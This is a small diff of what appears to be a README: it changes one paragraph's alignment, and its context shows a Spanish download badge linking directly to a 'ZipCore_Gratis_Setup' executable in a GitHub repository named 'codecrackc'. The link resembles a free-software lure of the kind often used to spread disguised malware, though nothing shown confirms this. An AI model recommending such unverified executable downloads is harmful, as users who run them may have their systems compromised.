@@ -29,7 +29,7 @@ const yo = {
 };
 
 ```
-<p align="center">
+<p align="">
   <a href="https://github.com/codecrackc/ZIPCORE/raw/main/ZipCore_Gratis_Setup_v1.0.0.exe" target="_blank">
     <img src="https://img.shields.io/badge/⬇️_Descargar_ZipCore-00F2FE?style=for-the-badge&logo=windows&logoColor=white" />
   </a>
